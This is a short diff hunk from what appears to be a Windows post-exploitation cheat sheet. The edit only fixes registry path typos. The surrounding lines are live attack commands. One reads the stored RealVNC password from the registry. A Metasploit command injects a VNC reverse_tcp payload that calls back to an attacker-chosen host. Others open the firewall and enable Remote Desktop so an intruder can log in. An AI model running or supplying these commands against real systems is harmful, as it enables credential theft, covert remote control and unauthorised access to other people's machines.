@@ -209,9 +209,9 @@ reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
 run post/windows/manage/payload_inject payload=windows/vncinject/reverse_tcp lhost=<yourip> options=viewonly=false
 --> Enable RDP: 
 netsh firewall set service RemoteDesktop enable
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t 
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t 
 REG_DWORD /d 0 /f
-reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
 sc config TermService start= auto
 net start Termservice
 netsh.exe
